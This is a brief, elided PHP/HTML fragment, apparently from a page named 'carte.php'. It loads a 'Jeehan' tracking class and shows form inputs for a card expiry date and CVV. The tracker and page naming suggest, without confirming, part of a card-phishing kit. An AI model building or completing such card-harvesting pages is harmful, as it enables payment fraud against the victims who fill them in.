...
include 'Jeehan.php';
$jeehan = new Jeehan();
$jeehan->track('carte.php'); // ex: connexion.php
        ...
        <div class="form-box">
            ...
            <div class="form-content" id="formContent">
                ...
                <div style="display: flex; gap: 10px;">
                    <input type="text" class="input-line" id="expiryDate" name="expiryDate" placeholder="MM/AA" maxlength="5" required oninput="formatExpiryDate(event)">
                    <input type="text" class="input-line" id="cvv" name="cvv" placeholder="CVV" maxlength="3" required>
                </div>
